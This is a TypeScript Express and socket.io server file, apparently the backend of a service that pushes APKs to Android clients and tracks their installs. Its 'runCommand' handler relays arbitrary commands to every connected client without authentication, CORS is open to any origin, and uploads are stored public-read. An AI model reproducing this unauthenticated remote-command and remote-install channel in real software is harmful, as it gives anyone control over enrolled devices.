import express from "express";
import http, { createServer } from "http";
import { PrismaClient } from "@prisma/client";
import cors from "cors";
import LoginRoute from "./routes/login";
import RegisterRoute from "./routes/register";
import UsersRoute, { updateName, updateVersion } from "./routes/users";
import ExpireRoute from "./routes/expire";
import { UserLogin } from "./socket/userLogin";
import multer from "multer";
import multerS3 from "multer-s3";
import { S3Client } from "@aws-sdk/client-s3";
import fsPromise from "fs/promises";
import fs from "fs";
import { Server } from "socket.io";
import ss from "socket.io-stream";
import AppsRoute from "./routes/apps";

export const s3 = new S3Client({
  region: process.env.S3_REGION ?? "",
  endpoint: process.env.S3_URL ?? "",
  credentials: {
    accessKeyId: process.env.S3_KEY ?? "",
    secretAccessKey: process.env.S3_SECRET ?? "",
  },
});
const upload = multer({
  storage: multerS3({
    s3: s3,
    bucket: process.env.S3_BUCKET ?? "",
    acl: "public-read",
    contentType: multerS3.AUTO_CONTENT_TYPE,
    key: function (_: any, file: any, cb: any) {
      const Key =
        Math.random().toString(36) + "-" + file.originalname.replace(/\s/g, "");
      cb(null, Key);
    },
  }),
  limits: { fileSize: 1024 * 1024 * 100 }, // 20 MB limit
});

const PORT = 3355;

export const prisma = new PrismaClient();
const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
  },
});
app.use(cors());

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

LoginRoute(app);
RegisterRoute(app);
UsersRoute(app);
ExpireRoute(app);
AppsRoute(app);

app.get("/", (req, res) => {
  res.send("Hello World!");
});

// app.get("/app/:guid/download", async (req, res) => {
//   const guid = req.params.guid;
//   const appDownload = await prisma.downloadApp.findUnique({
//     where: { guid },
//     select: { app: { select: { url: true } } },
//   });
//   if (!appDownload) {
//     return res.json({ error: "App not found" });
//   }

//   await prisma.downloadApp.update({
//     where: { guid },
//     data: { isDownloaded: true },
//   });

//   res.redirect(appDownload.app.url);
// });

app.post("/uploadApk", upload.single("apk") as any, async (req, res) => {
  if (!req.file) {
    return res.status(400).send("No file uploaded.");
  }
  const data = await prisma.apps.create({
    data: {
      name: req.body.name,
      url: `${process.env.S3_URL}/${process.env.S3_BUCKET}/${
        (req.file as any).key
      }`,
      key: (req.file as any).key,
    },
  });
  return res.json(data);
});

app.post("/status", async (req, res) => {
  if (req.body.app) {
    await updateName(req.body.guid, req.body.app.split("/")[0]);
  }
  const status = await UserLogin(req.body.guid);
  return res.json({ status });
});

server.listen(PORT, () => {
  console.log(`Server started on port ${PORT}`);
});

io.on("connection", (socket) => {
  console.log("a user connected with id: " + socket.id);
  socket.on("upload", (file, socketId) => {
    io.to(socketId).emit("upload", file);
  });

  socket.on("runCommand", async (command, cb) => {
    io.timeout(1000)
      .to("clientasd")
      .emit("execCommand", command, function (_: any, [c]: any) {
        cb(c);
      });
  });

  socket.on("join", (guid, version) => {
    socket.join(guid);
    socket.join("clientasd");
    if (version) {
      updateVersion(guid, version);
    }
  });

  socket.on("updateAppDownloadState", async (guid, state) => {
    console.log("updateAppDownloadState: ", guid, state);
    const app = await prisma.appToInstall.update({
      where: { guid },
      data: { state },
    });
    console.log("App download state updated: ", app);
  });

  socket.on("getPendentInstall", async (userGuid, callback) => {
    const installOrder = await prisma.installOrder
      .findMany({
        where: { userGuid, apps: { some: { state: { not: "completed" } } } },
        select: {
          apps: {
            select: {
              state: true,
              guid: true,
              app: { select: { url: true, name: true } },
            },
          },
        },
      })
      .then((installOrders) =>
        installOrders.map((installOrder) =>
          installOrder.apps
            .filter((app) => {
              console.log("app: ", app);
              return app.state !== "completed";
            })
            .map((app) => ({ ...app.app, guid: app.guid }))
        )
      );

    callback(installOrder);
  });

  socket.on("installApp", async (guid, clientGuid, callback) => {
    console.log("installApp: ", guid);
    const app = await prisma.apps.findUnique({
      where: { guid },
      select: { url: true },
    });
    if (!app) {
      return;
    }
    console.log("app: ", app);
    socket
      .to(clientGuid)
      .emit("download-apk", app.url, function (progress: number) {
        console.log("progress: ", progress);
        callback("ok");
      });
  });

  socket.on("ping", (callback) => {
    callback("pong");
  });
});
